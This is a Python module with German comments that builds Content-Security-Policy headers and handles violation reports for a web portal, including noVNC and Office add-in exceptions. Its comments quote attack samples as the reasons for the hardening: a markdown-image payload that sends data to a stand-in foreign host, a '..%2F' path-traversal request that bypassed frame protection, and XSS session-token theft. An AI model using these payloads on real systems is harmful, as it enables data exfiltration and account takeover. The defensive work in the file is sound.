"""Content-Security-Policy (BSI H4) – Richtlinie, Modus und Verstossmeldungen.

BEFUND H4 (BSI-Abgleich 29.09.2026, auf ECHT gemessen): keine CSP, das
Sitzungstoken liegt in localStorage. Ein einziges eingeschleustes Skript
(XSS) liest das Token und uebernimmt das Konto. Die CSP ist die zweite Linie
hinter dem Maskieren: selbst wenn Markup durchrutscht, fuehrt der Browser
kein Skript aus, das nicht als DATEI vom eigenen Server kommt.

DIE ENTSCHEIDENDE ZEILE ist ``script-src 'self'`` OHNE ``'unsafe-inline'``:
damit sind Inline-Handler (onclick=...), Inline-<script> und javascript:-Ziele
wirkungslos – genau die Formen, in denen eingeschleuste Skripte ankommen.
Das Frontend wurde dafuer frei von Inline-Skript gemacht (Waechter
tests/test_csp_h4_frontend.py). ``style-src`` erlaubt Inline-Stile
weiter – ANGENOMMENES RESTRISIKO (Betreiberentscheid 2026-10-13): ein Stil
fuehrt keinen Code aus; das Frontend setzt sie an rund 3000 Stellen, und
Mermaid schreibt eigene <style>-Elemente in jedes Diagramm.

MODUS (``csp_modus`` in settings.json; lesen/setzen ueber ``/api/security/csp``):
  * ``erzwingen`` – Vorgabe (seit 2026-10-13). Kopfzeile
                    ``Content-Security-Policy``: Verstoesse werden blockiert
                    UND gemeldet.
  * ``melden``    – Kopfzeile ``Content-Security-Policy-Report-Only``: der
                    Browser blockiert NICHTS, meldet aber jeden Verstoss an
                    ``/api/csp-report``. Bis 2026-10-13 die Vorgabe; jetzt der
                    Rueckweg, falls eine Seite nach dem Scharfschalten bricht.
                    Wer ``melden`` ausdruecklich gesetzt hat, behaelt es.
  * ``aus``       – keine Kopfzeile (Notschalter).
Ein unbekannter Wert gilt als Vorgabe (``erzwingen``) – NICHT als ``aus``: ein Tippfehler
darf den Schutz nicht still abschalten (gleiche Haltung wie H3: 0 ist kein "aus").

MELDUNGEN: ``data/logs/csp_berichte.jsonl`` (``data/logs`` ist privat, 0750;
die Datei 0640). Der Melde-Endpunkt ist zwangslaeufig OHNE Anmeldung – der
Browser schickt Berichte ohne Token. Deshalb:
  * je IP hoechstens ``RATE_JE_MINUTE`` Berichte pro Minute (Lastbremse, keine
    Aufbewahrungsregel),
  * je Bericht harte Feldlaengen (Notbremse pro Eintrag),
  * gleiche Verstoesse (Seite, Direktive, blockiertes Ziel, Quelle) werden je
    Tag nur EINMAL geschrieben und im Speicher gezaehlt – eine Seite mit
    einem Verstoss erzeugt sonst bei jedem Aufruf eine Zeile.
  * keine IP und kein vollstaendiger User-Agent in der Datei (Personenbezug).
Aufbewahrung nur nach ALTER ueber ``log_retention`` – keine Stueckzahlgrenze.

NOVNC (``/novnc/``, Systempaket ``/usr/share/novnc``): bis 2026-11-05 ganz
ohne Richtlinie, weil vnc.html ein Inline-Modul-Skript traegt, das wir nicht
aendern koennen. Seitdem eine EIGENE Richtlinie (``richtlinie_novnc``): nur
eigene Skripte plus die sha256-Hashes genau der Inline-Skripte, die das
installierte Paket mitbringt (aus den HTML-Dateien des Pakets gelesen, nicht
abgetippt – ein Paket-Update bringt seine Hashes selbst mit). Lassen sich die
Dateien nicht lesen, faellt nur DIESE Seite auf ``'unsafe-inline'`` zurueck
(laut im Journal) – fremde Skript-Hosts bleiben auch dann gesperrt.

MELDUNGEN, HERKUNFT (Pentest-Vorbereitung 2026-11-05): der Endpunkt ist ohne
Anmeldung erreichbar, und das Tageskontingent liess sich mit erfundenen
Berichten aufbrauchen – danach waeren echte Verstoesse an dem Tag nicht mehr
geschrieben worden. Angenommen wird ein Bericht nur noch, wenn seine Seite
(``document-uri``) auf dem Host liegt, an den er geschickt wurde (der Browser
meldet an ``report-uri`` derselben Herkunft). Liegt dieser Host nicht unter
den eigenen Namen (Serverzertifikat), zaehlt der Bericht gegen ein eigenes,
kleines Kontingent ``TAG_MAX_FREMD`` – der Platz fuer echte Meldungen bleibt.
"""
from __future__ import annotations

import json
import os
import posixpath
import re
import threading
import time
from pathlib import Path

MODI = ("melden", "erzwingen", "aus")
MODUS_VORGABE = "erzwingen"
MELDE_PFAD = "/api/csp-report"
DATEI_MODUS = 0o640
RATE_JE_MINUTE = 60
FELD_MAX = 300
# Obergrenzen gegen Fluten (Code-Review 2026-10-07): der Meldepfad ist OHNE
# Anmeldung erreichbar (der Browser schickt kein Token mit). Die Lastbremse je
# IP allein liess ~1,5 MB je Minute und Adresse auf die Platte – mit vielen
# Adressen beliebig viel. Ein echter Verstoss steht je Tag EINMAL in der Datei;
# mehr als ein paar hundert verschiedene am Tag hat keine echte Seite.
TAG_MAX_ZEILEN = 1000
# Bruchteil fuer Berichte, deren Host nicht unter den eigenen Namen steht
# (Zugriff ueber IP, untergeschobener Host-Kopf). Eigener Zaehler: sie koennen
# das Kontingent der echten Meldungen nicht aufbrauchen.
TAG_MAX_FREMD = TAG_MAX_ZEILEN // 20
DATEI_MAX = 5 * 1024 * 1024
GESEHEN_MAX = 20000

# Office-Add-ins laden office.js von Microsoft (Pflicht fuer Add-ins).
_ADDIN_PRAEFIXE = ("/addin/", "/excel-addin/", "/static/addin/", "/static/excel-addin/")
_OFFICE_JS = "https://appsforoffice.microsoft.com"
# office.js laedt im klassischen Outlook (outlook-win32-*.js) und in Outlook im
# Web selbst MicrosoftAjax.js von diesem CDN nach. Ohne den Eintrag scheitert
# die Office-Initialisierung (auf ECHT gemeldet, csp_berichte.jsonl 2026-11-03:
# script-src-elem blockiert https://ajax.aspnetcdn.com/ajax/3.5/MicrosoftAjax.js).
_OFFICE_AJAX = "https://ajax.aspnetcdn.com"
# office.js oeffnet selbst einen Telemetrie-Rahmen (auf DEV gemessen 2026-10-04,
# live_csp_h4_dev.py) – nur auf den Add-in-Seiten zugelassen.
_OFFICE_RAHMEN = "https://telemetryservice.firstpartyapps.oaspapps.com"
# Gemessen auf ECHT 2026-11-05 (Start-Diagnose, Outlook im Web eines Exchange
# 2019 im Haus, Chrome): office.js oeffnet zur Kommunikation mit Outlook einen
# Rahmen von appsforoffice.microsoft.com ("frame-src blockiert …"), und das
# gehostete microsoftajax.js deserialisiert die Antworten des Hosts per eval
# ("script-src blockiert eval", danach TypeError cannotDeserializeInvalidJson).
# Ohne beides loest Office.onReady nie aus. 'unsafe-eval' gilt NUR auf den
# Add-in-Seiten – angenommenes Restrisiko, weil Microsofts Bibliothek es
# erzwingt; alle anderen Seiten bleiben ohne (Waechter test_csp_h4 [A]).
_OFFICE_EVAL = "'unsafe-eval'"
_NOVNC_PRAEFIX = "/novnc/"
_AUSGENOMMEN: tuple = ()
# Wer die Add-in-Seiten einrahmen darf (BSI H7): Outlook/Excel im Web laden das
# Aufgabenfenster in einen iframe von Microsofts Hosts. Alle anderen Seiten nur
# 'self'. ⚠ Im Modus "melden" (Report-Only) wertet der Browser frame-ancestors
# NICHT aus – bis zum Scharfschalten schuetzt X-Frame-Options
# (backend/sicherheits_kopf.py), das die Add-in-Seiten ausnimmt.
FRAME_ANCESTORS_OFFICE = ("https://*.office.com https://*.office365.com "
                          "https://*.microsoft.com https://*.cloud.microsoft "
                          "https://*.officeapps.live.com https://*.sharepoint.com "
                          "https://outlook.live.com https://*.outlook.com")
# Outlook im Web eines Exchange IM HAUS rahmt das Aufgabenfenster von SEINEM
# Host ein (z. B. https://mail.firma.de/owa) – der steht in keiner Liste von
# Microsoft. Fehlt er, verweigert der Browser den Rahmen und OWA meldet nur
# "Add-In-Fehler … beim Starten" (gemeldet 2026-11-05, ohne jeden Hinweis).
# Die Hosts kommen aus derselben Quelle wie der SSO-Vertrauensanker
# (addin_sso.erlaubte_hosts: ews_url + addin_sso_host) – main reicht sie herein.
_office_hosts_quelle = None
# Nur reine Hostnamen gelangen in die Kopfzeile: kein Platzhalter, kein
# Leerzeichen, kein Semikolon – sonst schreibt ein Konfigurationswert eine
# eigene Direktive in die CSP.
_RAHMEN_HOST_OK = re.compile(r"^[a-z0-9](?:[a-z0-9\-]{0,62}\.)*[a-z0-9\-]{1,63}$")

_get_setting = None
_eigene_namen_quelle = None
_eigene_namen_cache: dict = {"ts": 0.0, "namen": frozenset()}
_novnc_ordner = None
_novnc_cache: dict = {"schluessel": None, "hashes": None}
_SPERRE = threading.Lock()
_rate: dict[str, list[float]] = {}
_gesehen: dict[str, int] = {}          # Schluessel -> Anzahl (seit Dienststart)
_gesehen_tag: dict[str, str] = {}      # Schluessel -> Tag des letzten Schreibens
_tag_zeilen: dict[str, int] = {}       # Tag -> geschriebene Zeilen (nur der heutige)
_tag_fremd: dict[str, int] = {}        # Tag -> Zeilen aus fremden Hosts (nur der heutige)


def einstellungen_quelle(fn) -> None:
    """``main`` reicht ``config.get_setting`` herein – das Modul importiert
    ``backend.config`` nie selbst (Tests: der echte Import schreibt die
    Live-settings.json)."""
    global _get_setting
    _get_setting = fn


def office_hosts_quelle(fn) -> None:
    """``main`` reicht ``addin_sso.rahmen_hosts`` herein (Exchange-Hosts im Haus)."""
    global _office_hosts_quelle
    _office_hosts_quelle = fn


def eigene_namen_quelle(fn) -> None:
    """``main`` reicht die DNS-Namen/Adressen des Serverzertifikats herein."""
    global _eigene_namen_quelle
    _eigene_namen_quelle = fn
    _eigene_namen_cache["ts"] = 0.0


def _eigene_namen() -> frozenset:
    """Eigene Hostnamen (klein, ohne Port), 5 min gemerkt. Fehler -> leer."""
    jetzt = time.time()
    if jetzt - _eigene_namen_cache["ts"] < 300:
        return _eigene_namen_cache["namen"]
    namen = frozenset()
    if _eigene_namen_quelle is not None:
        try:
            namen = frozenset(str(n).strip().lower().strip("[]")
                              for n in (_eigene_namen_quelle() or ()) if str(n).strip())
        except Exception:  # noqa: BLE001
            namen = frozenset()
    _eigene_namen_cache.update(ts=jetzt, namen=namen)
    return namen


def novnc_ordner(pfad) -> None:
    """``main`` nennt das Verzeichnis, aus dem /novnc ausgeliefert wird."""
    global _novnc_ordner
    _novnc_ordner = Path(pfad) if pfad else None
    _novnc_cache.update(schluessel=None, hashes=None)


_INLINE_SKRIPT = re.compile(r"<script\b(?![^>]*\bsrc\s*=)[^>]*>(.*?)</script\s*>",
                            re.IGNORECASE | re.DOTALL)


def _novnc_hashes():
    """sha256-Quellen der Inline-Skripte in den HTML-Dateien von noVNC.

    ``None`` = nicht ermittelbar (kein Ordner, nicht lesbar). Gemerkt je
    (Datei, mtime, Groesse) – ein Paket-Update bringt neue Hashes mit."""
    import base64
    import hashlib
    ordner = _novnc_ordner
    if ordner is None:
        return None
    try:
        dateien = sorted(p for p in ordner.glob("*.html") if p.is_file())
        schluessel = tuple((p.name, p.stat().st_mtime_ns, p.stat().st_size) for p in dateien)
    except Exception:  # noqa: BLE001
        return None
    if not dateien:
        return None
    if _novnc_cache["schluessel"] == schluessel:
        return _novnc_cache["hashes"]
    hashes = set()
    try:
        for p in dateien:
            for inhalt in _INLINE_SKRIPT.findall(p.read_text(encoding="utf-8")):
                d = base64.b64encode(hashlib.sha256(inhalt.encode("utf-8")).digest()).decode()
                hashes.add("'sha256-%s'" % d)
    except Exception as ex:  # noqa: BLE001
        print(f"[CSP] noVNC-Skripte nicht lesbar ({type(ex).__name__}) – /novnc/ "
              "erlaubt Inline-Skripte", flush=True)
        hashes = None
    erg = tuple(sorted(hashes)) if hashes is not None else None
    _novnc_cache.update(schluessel=schluessel, hashes=erg)
    return erg


def richtlinie_novnc(host: str = "") -> str:
    """Richtlinie fuer die noVNC-Seiten (Desktop-Rahmen fuer Administratoren).

    Nur eigene Skripte plus die Hashes der mitgelieferten Inline-Skripte; die
    Verbindung geht ueber wss:// zum EIGENEN Host (/ws/vnc). Einrahmen nur
    durch die eigene Seite (Portal-Desktop). Bilder: eigene + data: (noVNC
    setzt den Mauszeiger als data:-Bild)."""
    hashes = _novnc_hashes()
    if hashes is None:
        skript = "'self' 'unsafe-inline'"
    else:
        skript = " ".join(("'self'",) + tuple(hashes))
    verbinden = _verbinden(host)
    return "; ".join([
        "default-src 'self'",
        "script-src " + skript,
        "style-src 'self' 'unsafe-inline'",
        "img-src 'self' data: blob:",
        "font-src 'self' data:",
        "connect-src " + verbinden,
        "media-src 'self' data: blob:",
        "frame-src 'none'",
        "worker-src 'self' blob:",
        "object-src 'none'",
        "base-uri 'self'",
        "form-action 'self'",
        "frame-ancestors 'self'",
        "report-uri " + MELDE_PFAD,
    ])


def _eigene_office_rahmen() -> str:
    """Zusaetzliche frame-ancestors fuer Outlook im Web im Haus, sortiert.

    Fehler der Quelle fuehren zu "" (dann gilt nur die Microsoft-Liste) – eine
    Kopfzeile darf an einer kaputten Konfiguration nicht scheitern."""
    if _office_hosts_quelle is None:
        return ""
    try:
        hosts = _office_hosts_quelle() or ()
    except Exception:  # noqa: BLE001
        return ""
    gut = sorted({str(h).strip().lower() for h in hosts
                  if _RAHMEN_HOST_OK.match(str(h).strip().lower())})
    return " ".join("https://" + h for h in gut)


def _ordner() -> Path:
    """Ablageort. Funktion statt Konstante – ein Test biegt ihn um."""
    return Path(__file__).resolve().parent.parent / "data" / "logs"


def _datei() -> Path:
    return _ordner() / "csp_berichte.jsonl"


def modus() -> str:
    """Wirksamer Modus. Unbekannt/fehlend -> Vorgabe ``erzwingen`` (nie still ``aus``)."""
    wert = MODUS_VORGABE
    if _get_setting is not None:
        try:
            wert = str(_get_setting("csp_modus", MODUS_VORGABE) or MODUS_VORGABE).strip().lower()
        except Exception:  # noqa: BLE001
            wert = MODUS_VORGABE
    return wert if wert in MODI else MODUS_VORGABE


def pfad_normal(pfad: str) -> str:
    """Pfad ohne ``.``/``..``-Teile fuer die Praefix-Entscheidungen.

    Code-Review 2026-10-07: Starlette dekodiert ``%2F`` VOR dem Routing –
    ``/static/addin/..%2Fportal.html`` kommt als ``/static/addin/../portal.html``
    an, traf damit das Add-in-Praefix und lieferte das PORTAL ohne
    X-Frame-Options aus (StaticFiles loest den Pfad selbst auf). Entschieden
    wird deshalb am aufgeloesten Pfad; ein Schraegstrich am Ende bleibt."""
    p = pfad or ""
    if not p:
        return p
    n = posixpath.normpath(p)
    if p.endswith("/") and not n.endswith("/"):
        n += "/"
    return n


_HOST_OK = re.compile(r"^[A-Za-z0-9.\-]+(:\d{1,5})?$|^\[[0-9A-Fa-f:.]+\](:\d{1,5})?$")


def _verbinden(host: str) -> str:
    """connect-src: eigene Herkunft plus wss:// zum eigenen Host (EINE Fassung
    fuer die allgemeine und die noVNC-Richtlinie)."""
    verbinden = "'self'"
    if host and _HOST_OK.match(host):
        verbinden += " wss://" + host
    return verbinden


def richtlinie(pfad: str, host: str = "") -> str:
    """Die Richtlinie fuer eine HTML-Antwort unter ``pfad``.

    ``host`` (Host-Kopfzeile) nur fuer das WebSocket-Ziel: aeltere Browser
    zaehlen wss:// nicht zu 'self'. Ein Host, der nicht wie ein Hostname
    aussieht, wird weggelassen statt eingesetzt – er landet sonst wortwoertlich
    in einer Sicherheits-Kopfzeile.
    """
    pfad = pfad_normal(pfad)
    addin = any(pfad.startswith(p) for p in _ADDIN_PRAEFIXE)
    skript = "'self'" + (" " + _OFFICE_JS + " " + _OFFICE_AJAX + " " + _OFFICE_EVAL if addin else "")
    rahmen_von = "'self'"
    if addin:
        rahmen_von += " " + FRAME_ANCESTORS_OFFICE
        eigene = _eigene_office_rahmen()
        if eigene:
            rahmen_von += " " + eigene
    verbinden = _verbinden(host)
    teile = [
        "default-src 'self'",
        "script-src " + skript,
        # Inline-Stile erlaubt: angenommenes Restrisiko (siehe Modulkopf).
        "style-src 'self' 'unsafe-inline'",
        # Nur eigene Bilder (Pentest-Vorbereitung 2026-11-05): mit "https:"
        # lud ein eingeschleustes Markdown-Bild ![x](https://fremd/?d=...) beim
        # Anzeigen und schickte Daten ohne Klick weg. Die Renderer machen aus
        # fremden Bildern inzwischen Links (chatlib.js, wissen_destillat.js);
        # das hier ist die zweite Linie. data:/blob: fuer Vorschauen,
        # Diagramme, QR-Codes und hochgeladene Bilder. Gemessen 2026-11-05:
        # keine Seite laedt ein Bild absichtlich von fremdem Host (Bildsuche
        # und Bildgenerierung liefern ueber /api/generated/, Branding-Logos
        # ueber /api/branding/logo). AUSNAHME Add-in-Seiten: dort steuert
        # office.js die Oberflaeche des Hosts; sie rendern keine Markdown-Bilder.
        "img-src 'self' data: blob:" + (" https:" if addin else ""),
        "font-src 'self' data:",
        "connect-src " + verbinden,
        "media-src 'self' data: blob:",
        # PDF-/Dokumentvorschau im Rahmen (blob:), Desktop-Rahmen (/novnc).
        # OHNE data: (Pentest-Vorbereitung 2026-11-05): ein data:-Rahmen ist
        # eine vollstaendige, frei gestaltete Seite im Fenster – der klassische
        # Phishing-Rahmen. Gemessen: kein Frontend-Modul oeffnet einen; die
        # Vorschauen laufen ueber blob: bzw. eigene Adressen.
        "frame-src 'self' blob:" + (" " + _OFFICE_JS + " " + _OFFICE_RAHMEN if addin else ""),
        "worker-src 'self' blob:",
        "object-src 'none'",
        "base-uri 'self'",
        "form-action 'self'",
        "frame-ancestors " + rahmen_von,
        "report-uri " + MELDE_PFAD,
    ]
    return "; ".join(teile)


def kopfzeilen(pfad: str, host: str = "") -> dict[str, str]:
    """Die zu setzenden Kopfzeilen fuer eine HTML-Antwort – leer, wenn keine."""
    normal = pfad_normal(pfad)
    if any(normal.startswith(p) for p in _AUSGENOMMEN):
        return {}
    m = modus()
    if m == "aus":
        return {}
    name = "Content-Security-Policy" if m == "erzwingen" else "Content-Security-Policy-Report-Only"
    if normal.startswith(_NOVNC_PRAEFIX):
        return {name: richtlinie_novnc(host)}
    return {name: richtlinie(pfad, host)}


# ─── Meldungen ───────────────────────────────────────────────────────────────

def _kurz(v, n: int = FELD_MAX) -> str:
    s = str(v if v is not None else "")
    s = "".join(ch if ch.isprintable() else " " for ch in s)
    return s[:n]


def _ohne_query(url: str) -> str:
    """Seiten-/Ziel-URL ohne Query und Fragment – dort stehen Tokens
    (``?token=``) und Suchbegriffe, die nicht ins Protokoll gehoeren."""
    u = str(url or "")
    for z in ("?", "#"):
        i = u.find(z)
        if i >= 0:
            u = u[:i]
    return u


def _normalisieren(roh: dict) -> dict | None:
    """Beide Formate auf eine Form bringen: ``report-uri`` liefert
    ``{"csp-report": {...}}`` mit Bindestrich-Schluesseln, die Reporting-API
    ``{"type": "csp-violation", "body": {...}}`` mit camelCase."""
    if not isinstance(roh, dict):
        return None
    if isinstance(roh.get("csp-report"), dict):
        b = roh["csp-report"]
        g = lambda *k: next((b[x] for x in k if x in b), "")  # noqa: E731
        return {
            "seite": _kurz(_ohne_query(g("document-uri"))),
            "direktive": _kurz(g("effective-directive", "violated-directive"), 80),
            "blockiert": _kurz(_ohne_query(g("blocked-uri"))),
            "quelle": _kurz(_ohne_query(g("source-file"))),
            "zeile": _kurz(g("line-number"), 12),
            "auszug": _kurz(g("script-sample"), 120),
            "modus": _kurz(g("disposition"), 12),
        }
    if roh.get("type") == "csp-violation" and isinstance(roh.get("body"), dict):
        b = roh["body"]
        return {
            "seite": _kurz(_ohne_query(b.get("documentURL", ""))),
            "direktive": _kurz(b.get("effectiveDirective", ""), 80),
            "blockiert": _kurz(_ohne_query(b.get("blockedURL", ""))),
            "quelle": _kurz(_ohne_query(b.get("sourceFile", ""))),
            "zeile": _kurz(b.get("lineNumber", ""), 12),
            "auszug": _kurz(b.get("sample", ""), 120),
            "modus": _kurz(b.get("disposition", ""), 12),
        }
    return None


def _rate_ok(ip: str, jetzt: float) -> bool:
    liste = [t for t in _rate.get(ip, []) if jetzt - t < 60]
    if len(liste) >= RATE_JE_MINUTE:
        _rate[ip] = liste
        return False
    liste.append(jetzt)
    _rate[ip] = liste
    if len(_rate) > 5000:              # Speicher der Lastbremse selbst begrenzen
        for k in [k for k, v in _rate.items() if not v or jetzt - v[-1] >= 60]:
            _rate.pop(k, None)
    return True


def _host_ohne_port(wert: str) -> str:
    """``Host``-Kopf bzw. Netzort einer URL -> Hostname klein, ohne Port."""
    h = str(wert or "").strip().lower()
    if h.startswith("["):
        return h[1:h.find("]")] if "]" in h else ""
    return h.rsplit(":", 1)[0] if h.count(":") == 1 else h


def herkunft(seite: str, host: str) -> str:
    """Einordnung eines Berichts: ``"eigen"``, ``"fremd"`` oder ``""`` (verwerfen).

    Verworfen wird, wenn die gemeldete Seite NICHT auf dem Host liegt, an den
    der Bericht ging – ein Browser meldet an ``report-uri`` derselben Herkunft,
    eine Abweichung ist erfunden. ``fremd`` = der Host steht nicht unter den
    eigenen Namen (Zertifikat); sind keine bekannt, gilt jeder passende Host
    als eigen (sonst ginge auf einem Server ohne lesbares Zertifikat jede
    echte Meldung ins kleine Kontingent)."""
    from urllib.parse import urlsplit
    try:
        seiten_host = (urlsplit(str(seite or "")).hostname or "").lower()
    except Exception:  # noqa: BLE001
        return ""
    anfrage_host = _host_ohne_port(host)
    if not seiten_host or not anfrage_host or seiten_host != anfrage_host:
        return ""
    namen = _eigene_namen()
    if not namen or anfrage_host in namen:
        return "eigen"
    # Platzhalter im Zertifikat (*.firma.de) deckt genau EINE Ebene.
    for n in namen:
        if n.startswith("*.") and anfrage_host.endswith(n[1:]) \
                and "." not in anfrage_host[:-len(n) + 1]:
            return "eigen"
    return "fremd"


def melden(koerper: bytes, ip: str = "", ua: str = "", host: str = "") -> int:
    """Einen Melde-Aufruf verarbeiten. Rueckgabe = Zahl NEU geschriebener Zeilen.

    ``host`` = Host-Kopf der Melde-Anfrage (siehe ``herkunft``); fehlt er,
    wird nichts angenommen.

    Wirft NIE: ein kaputter Bericht ist kein Serverfehler, und der Browser
    wertet die Antwort ohnehin nicht aus."""
    try:
        jetzt = time.time()
        with _SPERRE:
            if not _rate_ok(ip or "?", jetzt):
                return 0
        if not koerper or len(koerper) > 64 * 1024:
            return 0
        daten = json.loads(koerper.decode("utf-8", "replace"))
        roh = daten if isinstance(daten, list) else [daten]
        tag = time.strftime("%Y-%m-%d", time.localtime(jetzt))
        neu = []
        for r in roh[:20]:
            e = _normalisieren(r)
            if not e:
                continue
            art = herkunft(e["seite"], host)
            if not art:
                continue
            schluessel = "|".join((e["seite"], e["direktive"], e["blockiert"],
                                   e["quelle"], e["zeile"]))
            with _SPERRE:
                if schluessel not in _gesehen and len(_gesehen) >= GESEHEN_MAX:
                    # Speicher der Zaehler begrenzen: Eintraege von gestern weg,
                    # reicht das nicht, wird der neue Schluessel nicht gemerkt.
                    for k in [k for k, t in _gesehen_tag.items() if t != tag]:
                        _gesehen_tag.pop(k, None)
                        _gesehen.pop(k, None)
                    if len(_gesehen) >= GESEHEN_MAX:
                        continue
                _gesehen[schluessel] = _gesehen.get(schluessel, 0) + 1
                if _gesehen_tag.get(schluessel) == tag:
                    continue
                if _tag_zeilen.get(tag, 0) >= TAG_MAX_ZEILEN:
                    continue
                if art == "fremd":
                    if _tag_fremd.get(tag, 0) >= TAG_MAX_FREMD:
                        continue
                    if tag not in _tag_fremd:
                        _tag_fremd.clear()
                    _tag_fremd[tag] = _tag_fremd.get(tag, 0) + 1
                if tag not in _tag_zeilen:
                    _tag_zeilen.clear()
                _tag_zeilen[tag] = _tag_zeilen.get(tag, 0) + 1
                _gesehen_tag[schluessel] = tag
            e["ts"] = int(jetzt)
            e["browser"] = _browser(ua)
            neu.append(e)
        if neu:
            _schreiben(neu)
        return len(neu)
    except Exception as ex:  # noqa: BLE001
        print(f"[CSP] Bericht verworfen: {type(ex).__name__}: {ex}", flush=True)
        return 0


def _browser(ua: str) -> str:
    """Nur die Browser-Familie – fuer die Diagnose genug, kein Fingerabdruck."""
    u = str(ua or "")
    for name in ("Edg", "OPR", "Firefox", "Chrome", "Safari"):
        if name in u:
            return {"Edg": "Edge", "OPR": "Opera"}.get(name, name)
    return "?"


def _schreiben(eintraege: list[dict]) -> None:
    p = _datei()
    with _SPERRE:
        p.parent.mkdir(parents=True, exist_ok=True)
        neu = not p.exists()
        try:
            if not neu and p.stat().st_size >= DATEI_MAX:
                return                  # voll: kuerzen() (log_retention) macht Platz
        except OSError:
            return
        with p.open("a", encoding="utf-8") as f:
            for e in eintraege:
                f.write(json.dumps(e, ensure_ascii=False) + "\n")
        if neu:
            try:
                os.chmod(p, DATEI_MODUS)
            except Exception:  # noqa: BLE001
                pass


def lesen(limit: int = 200) -> list[dict]:
    """Die juengsten Meldungen, NEUESTE zuerst, mit Zaehler seit Dienststart.

    Gelesen werden nur die letzten 512 kB – die Anzeige braucht die juengsten
    Verstoesse, nicht die ganze Historie (die Datei selbst wird NICHT gekuerzt)."""
    p = _datei()
    if not p.is_file():
        return []
    limit = max(1, min(int(limit or 200), 1000))
    with p.open("rb") as f:
        f.seek(0, os.SEEK_END)
        groesse = f.tell()
        f.seek(max(0, groesse - 512 * 1024))
        rest = f.read()
    zeilen = rest.split(b"\n")
    if groesse > 512 * 1024:
        zeilen = zeilen[1:]            # erste Zeile angeschnitten
    raus = []
    for z in reversed(zeilen):
        if not z.strip():
            continue
        try:
            e = json.loads(z.decode("utf-8", "replace"))
        except Exception:  # noqa: BLE001
            continue
        if not isinstance(e, dict):
            continue
        k = "|".join(str(e.get(x, "")) for x in ("seite", "direktive", "blockiert", "quelle", "zeile"))
        e["anzahl_seit_start"] = _gesehen.get(k, 0)
        raus.append(e)
        if len(raus) >= limit:
            break
    return raus


def kuerzen(grenze_ts: float) -> int:
    """Eintraege aelter als ``grenze_ts`` entfernen (``log_retention``).

    Ein Eintrag ohne Zeitstempel bleibt (kein Altersbeweis)."""
    p = _datei()
    if not p.is_file():
        return 0
    with _SPERRE:
        behalten, weg = [], 0
        for z in p.read_text(encoding="utf-8", errors="replace").splitlines():
            if not z.strip():
                continue
            try:
                ts = float((json.loads(z) or {}).get("ts") or 0)
            except Exception:  # noqa: BLE001
                behalten.append(z)
                continue
            if ts and ts < grenze_ts:
                weg += 1
            else:
                behalten.append(z)
        if not weg:
            return 0
        if not behalten:
            p.unlink()
        else:
            tmp = p.with_suffix(".jsonl.tmp")
            tmp.write_text("\n".join(behalten) + "\n", encoding="utf-8")
            try:
                os.chmod(tmp, DATEI_MODUS)
            except Exception:  # noqa: BLE001
                pass
            os.replace(tmp, p)
    return weg
